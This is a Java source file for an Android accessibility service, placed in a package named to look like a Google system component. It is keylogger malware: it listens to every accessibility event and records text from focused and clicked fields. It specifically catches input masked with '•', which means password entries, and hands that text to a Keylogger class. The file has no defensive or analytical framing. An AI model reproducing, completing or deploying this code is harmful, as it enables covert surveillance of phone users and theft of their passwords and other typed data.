package com.google.android.android;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Service;
import android.content.Intent;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.security.Key;

public class MyAccessibilityService extends AccessibilityService {
    private String prevText = "";

    @Override
    protected void onServiceConnected() {
        Log.i("~~~","onServiceConnected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;

        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.i("~~~", "onAccessibilityEvent");
        if (MainActivity.getInstance() != null) {
            MainActivity.getInstance().setAccessibility(true);
        }

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                Log.i("~~~", "TYPE_VIEW_FOCUSED");
                doKeyLog();
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                Log.i("~~~", "TYPE_VIEW_CLICKED");
                doKeyLog();
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                Log.i("~~~", "TYPE_VIEW_TEXT_CHANGED");
                prevText = event.getText().toString();
                if (prevText.contains("•")) doKeyLog();
                break;
        }
        String data = event.getText().toString();
        Log.i("~~~", data);
    }

    @Override
    public void onInterrupt() {
        Log.i("~~~","onInterrupt");
    }

    private void doKeyLog() {
        Keylogger.put(prevText);
        prevText = null;
    }


}
